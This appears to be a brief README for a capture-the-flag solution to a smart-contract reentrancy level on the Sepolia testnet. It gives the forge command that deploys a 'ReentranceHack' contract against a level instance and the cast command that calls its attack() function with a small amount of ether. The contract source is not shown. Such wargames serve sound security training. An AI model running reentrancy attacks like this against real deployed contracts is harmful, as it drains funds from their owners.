# Reentrance Solution

Deploy:

```bash
forge create ReentranceHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args <instanceAddress>
```

Run:

```bash
cast send <reentranceHackAddress> "attack()" --value 10000000000000000wei --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
